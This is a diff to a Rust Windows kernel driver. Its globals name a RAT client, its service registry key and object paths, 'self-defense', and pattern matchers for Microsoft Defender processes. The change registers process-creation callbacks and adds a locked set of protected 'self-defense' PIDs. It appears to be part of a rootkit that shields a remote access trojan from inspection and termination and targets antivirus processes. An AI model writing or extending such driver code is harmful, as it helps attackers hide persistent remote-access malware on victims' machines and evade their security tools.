@@ -1,4 +1,5 @@
 use alloc::boxed::Box;
+use alloc::collections::BTreeSet;
 use core::ffi::c_void;
 use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
@@ -22,10 +23,11 @@ use crate::global::{
     MAX_INITIALIZE_ATTEMPTS, MS_DEFENDER_AHO_CORASICK, MS_DEFENDER_PROCESS_PATTERN,
     OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
     PROCESS_NOTIFY_ROUTINE, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
-    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT,
+    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT, SELF_DEFENSE_PIDS,
 };
 use crate::handlers::{device, object, process};
 use crate::wrappers::bindings::InitializeObjectAttributes;
+use crate::wrappers::lock::SpinLock;
 use crate::wrappers::{fs, registry};
 use crate::{cleanup, error, info};
 
@@ -180,12 +182,17 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
     })?;
     cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));
 
+    // Register process creation/deletion callback
     let ps = process::ps_set_create_process_notify_routine_ex(extra).inspect_err(|e| {
         error!("Failed to register process callbacks: {e}");
     })?;
     cleanup::cleanup_process_notify_routine(
         PROCESS_NOTIFY_ROUTINE.swap(ps as *mut u8, Ordering::AcqRel),
     );
+
+    // Construct data structure to track self-defense PIDs
+    let pids = Box::into_raw(Box::new(SpinLock::new(BTreeSet::new())));
+    cleanup::cleanup_self_defense_pids(SELF_DEFENSE_PIDS.swap(pids, Ordering::AcqRel));
 
     // Create device object
     let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
